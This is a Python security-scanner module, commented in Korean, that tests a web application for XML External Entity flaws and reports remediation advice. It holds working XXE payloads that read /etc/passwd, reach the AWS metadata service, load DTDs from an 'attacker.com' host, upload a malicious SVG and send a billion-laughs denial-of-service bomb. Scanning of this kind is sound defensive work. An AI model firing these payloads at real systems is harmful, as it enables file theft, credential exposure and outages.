"""
XXE (XML External Entity) 공격
XML 파싱 취약점, DTD 처리, XXE Injection
"""
import requests

def scan(target_url):
    result = {
        'name': 'XXE (XML External Entity)',
        'category': 'Injection',
        'status': 'SAFE',
        'severity': 'HIGH',
        'vulnerabilities': [],
        'recommendation': 'XML 파서 외부 엔티티 비활성화, JSON 사용 권장, DTD 처리 금지',
        'details': ''
    }
    
    details = []
    
    # XXE 페이로드
    xxe_payloads = [
        # Basic XXE (파일 읽기)
        ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>""", "Basic XXE - /etc/passwd", ["root:", "daemon:", "bin/bash"]),
        
        # Windows 파일
        ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<data>&xxe;</data>""", "Windows XXE", ["[fonts]", "[extensions]"]),
        
        # PHP wrapper
        ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>""", "PHP Wrapper", ["base64", "cm9vd"]),
        
        # HTTP SSRF
        ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>""", "XXE SSRF - AWS", ["ami-", "instance"]),
        
        # Parameter Entity
        ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
%xxe;
]>
<data>test</data>""", "Parameter Entity", ["root:"]),
        
        # External DTD
        ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<data>test</data>""", "External DTD", ["<!ENTITY"]),
        
        # Blind XXE (Out-of-band)
        ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<data>test</data>""", "Blind XXE", []),
        
        # UTF-7 Encoding
        ("""+ADw-?xml version=+ACI-1.0+ACI- encoding=+ACI-UTF-7+ACI-?+AD4-
+ADw-!DOCTYPE foo+AFs-
+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-data+AD4-+ACY-xxe+ADsAPA-/data+AD4-""", "UTF-7 XXE", ["root:"]),
    ]
    
    # 1. XML 파싱 엔드포인트 테스트
    details.append("[XXE-1] XML 파싱 XXE 테스트")
    
    xml_endpoints = [
        f"{target_url}/api/import",
        f"{target_url}/api/upload",
        f"{target_url}/api/xml",
        f"{target_url}/api/data",
    ]
    
    for endpoint in xml_endpoints:
        for payload, payload_name, indicators in xxe_payloads:
            try:
                headers = {
                    'Content-Type': 'application/xml',
                    'X-Security-Mode': 'vulnerable'
                }
                
                resp = requests.post(endpoint, data=payload, headers=headers, timeout=5)
                
                # 파일 내용이 응답에 포함되었는지 확인
                if any(indicator in resp.text for indicator in indicators):
                    result['vulnerabilities'].append(f"XXE: {endpoint} - {payload_name}")
                    details.append(f"  ✗ {payload_name} 성공")
                    result['status'] = 'VULNERABLE'
                    break
                
                # Base64 인코딩된 내용
                elif 'base64' in payload_name.lower() and len(resp.text) > 100:
                    result['vulnerabilities'].append(f"XXE: {payload_name}")
                    details.append(f"  ✗ {payload_name} - Base64 데이터 노출")
                    result['status'] = 'VULNERABLE'
                    break
                    
            except:
                pass
                
        if result['status'] == 'VULNERABLE':
            break
    
    # 2. SOAP 엔드포인트 XXE
    details.append("\n[XXE-2] SOAP XXE 테스트")
    
    try:
        soap_xxe = """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Body>
<data>&xxe;</data>
</soap:Body>
</soap:Envelope>"""
        
        soap_endpoints = [
            f"{target_url}/api/soap",
            f"{target_url}/soap",
            f"{target_url}/ws",
        ]
        
        for endpoint in soap_endpoints:
            try:
                headers = {
                    'Content-Type': 'text/xml',
                    'SOAPAction': 'test',
                    'X-Security-Mode': 'vulnerable'
                }
                
                resp = requests.post(endpoint, data=soap_xxe, headers=headers, timeout=5)
                
                if 'root:' in resp.text or 'daemon:' in resp.text:
                    result['vulnerabilities'].append(f"SOAP XXE: {endpoint}")
                    details.append(f"  ✗ SOAP XXE 성공")
                    result['status'] = 'VULNERABLE'
                    break
                    
            except:
                pass
                
    except:
        details.append("  • SOAP 엔드포인트 없음")
    
    # 3. DOCTYPE 처리 확인
    details.append("\n[XXE-3] DOCTYPE 처리 확인")
    
    try:
        # DOCTYPE만 포함
        doctype_test = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ELEMENT test ANY>
]>
<data>test</data>"""
        
        headers = {
            'Content-Type': 'application/xml',
            'X-Security-Mode': 'vulnerable'
        }
        
        resp = requests.post(f"{target_url}/api/import", 
                           data=doctype_test, headers=headers, timeout=5)
        
        if resp.status_code in [200, 201]:
            result['vulnerabilities'].append("DOCTYPE 처리 활성화 (XXE 위험)")
            details.append("  ⚠ XML DOCTYPE 처리됨")
            result['status'] = 'VULNERABLE'
        else:
            details.append("  ✓ DOCTYPE 처리 차단")
            
    except:
        details.append("  • DOCTYPE 테스트 실패")
    
    # 4. XML Bomb (Billion Laughs Attack)
    details.append("\n[XXE-4] XML Bomb (DoS)")
    
    try:
        xml_bomb = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>"""
        
        headers = {
            'Content-Type': 'application/xml',
            'X-Security-Mode': 'vulnerable'
        }
        
        import time
        start = time.time()
        
        try:
            resp = requests.post(f"{target_url}/api/import", 
                               data=xml_bomb, headers=headers, timeout=5)
            elapsed = time.time() - start
            
            if resp.status_code in [200, 500]:
                result['vulnerabilities'].append("XML Bomb (DoS 위험)")
                details.append(f"  ✗ XML 엔티티 확장 제한 없음 ({elapsed:.1f}초)")
                result['status'] = 'VULNERABLE'
                
        except requests.Timeout:
            result['vulnerabilities'].append("XML Bomb으로 서버 부하")
            details.append("  ✗ XML 엔티티 확장으로 타임아웃")
            result['status'] = 'VULNERABLE'
            
    except:
        details.append("  • XML Bomb 테스트 실패")
    
    # 5. XInclude 공격
    details.append("\n[XXE-5] XInclude 공격")
    
    try:
        xinclude = """<?xml version="1.0" encoding="UTF-8"?>
<data xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///etc/passwd"/>
</data>"""
        
        headers = {
            'Content-Type': 'application/xml',
            'X-Security-Mode': 'vulnerable'
        }
        
        resp = requests.post(f"{target_url}/api/import", 
                           data=xinclude, headers=headers, timeout=5)
        
        if 'root:' in resp.text:
            result['vulnerabilities'].append("XInclude 공격 가능")
            details.append("  ✗ XInclude로 파일 읽기 성공")
            result['status'] = 'VULNERABLE'
        else:
            details.append("  ✓ XInclude 차단")
            
    except:
        details.append("  • XInclude 테스트 실패")
    
    # 6. SVG XXE
    details.append("\n[XXE-6] SVG 파일 XXE")
    
    try:
        svg_xxe = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>"""
        
        # 파일 업로드로 테스트
        files = {
            'file': ('malicious.svg', svg_xxe.encode(), 'image/svg+xml')
        }
        
        headers = {'X-Security-Mode': 'vulnerable'}
        
        resp = requests.post(f"{target_url}/api/teams/1/files", 
                           files=files, headers=headers, timeout=5)
        
        if resp.status_code in [200, 201]:
            result['vulnerabilities'].append("SVG XXE 가능")
            details.append("  ⚠ SVG 파일 XXE 업로드 성공")
            
    except:
        details.append("  • SVG XXE 테스트 불가")
    
    # 7. XLSX/DOCX XXE
    details.append("\n[XXE-7] Office 문서 XXE")
    
    try:
        # XLSX, DOCX는 XML 기반이므로 XXE 가능
        office_xxe = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>"""
        
        # 실제로는 ZIP 파일 내부의 XML 수정 필요
        details.append("  • Office 문서 XXE는 수동 테스트 필요")
        
    except:
        pass
    
    # 8. 에러 메시지 분석
    details.append("\n[XXE-8] XML 파서 에러 분석")
    
    try:
        malformed_xml = """<?xml version="1.0" encoding="UTF-8"?>
<data>test"""
        
        headers = {'Content-Type': 'application/xml'}
        resp = requests.post(f"{target_url}/api/import", 
                           data=malformed_xml, headers=headers, timeout=5)
        
        # XML 파서 정보 노출
        parser_info = [
            'libxml', 'xerces', 'msxml', 'saxon',
            'javax.xml', 'org.xml', 'SAXParseException'
        ]
        
        for parser in parser_info:
            if parser in resp.text:
                result['vulnerabilities'].append(f"XML 파서 정보 노출: {parser}")
                details.append(f"  ⚠ XML 파서: {parser}")
                break
                
    except:
        pass
    
    if result['status'] == 'SAFE':
        details.append("\n✓ XXE 방어가 잘 되어 있습니다")
    
    result['details'] = '\n'.join(details)
    return result